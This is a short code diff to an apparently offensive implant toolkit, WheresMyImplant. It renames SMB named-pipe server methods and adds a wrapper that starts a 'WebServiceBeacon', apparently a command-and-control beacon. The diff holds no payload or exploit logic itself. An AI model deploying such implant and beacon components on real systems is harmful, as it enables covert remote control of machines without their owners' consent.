@@ -448,7 +448,6 @@ namespace WheresMyImplant
             return output.ToString();
         }
 
-
         //FormalChicken
         public static void StartSmbServer(String pipeName)
         {
@@ -457,8 +456,8 @@ namespace WheresMyImplant
             {
                 using (SMBServer smbServer = new SMBServer(pipeName))
                 {
-                    smbServer.waitForConnection();
-                    smbServer.mainLoop();
+                    smbServer.WaitForConnection();
+                    smbServer.MainLoop();
                 }
             }
         }
@@ -468,6 +467,16 @@ namespace WheresMyImplant
         {
             Console.WriteLine("Starting Web Service");
             WebService webService = new WebService(serviceName, port);
+        }
+
+        //DiscoChicken
+        public static void StartWebServiceBeacon(String socket, String provider)
+        {
+            using (WebServiceBeacon webServiceBeacon = new WebServiceBeacon(socket, provider))
+            {
+                Console.WriteLine("Starting Web Servic Beacon");
+                webServiceBeacon.Run();
+            }
         }
     }
 }
